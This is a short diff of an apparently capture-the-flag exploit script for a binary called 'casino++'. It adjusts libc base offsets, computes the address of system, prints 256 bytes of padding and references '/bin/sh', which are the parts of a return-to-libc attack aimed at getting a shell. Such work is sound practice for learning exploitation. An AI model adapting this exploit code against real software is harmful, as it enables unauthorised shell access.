@@ -6,9 +6,9 @@ l = ELF('./casino++')
 #print '/bin/sh -> ', hex(l.search('/bin/sh').next())
 
 print 'a'*256
-lib0 = 0x7ffff7dd0760 - 0x3ec760
+lib0 = 0x7fbcadb13ab0 - 0x21ab0
 lib = 0x7ffff7af4070 - 0x110070
-system = lib + 0x4f440
+system = lib0 + 0x4f440
 print hex(lib), hex(lib0), hex(system)
 
 bss = 0x601ff0
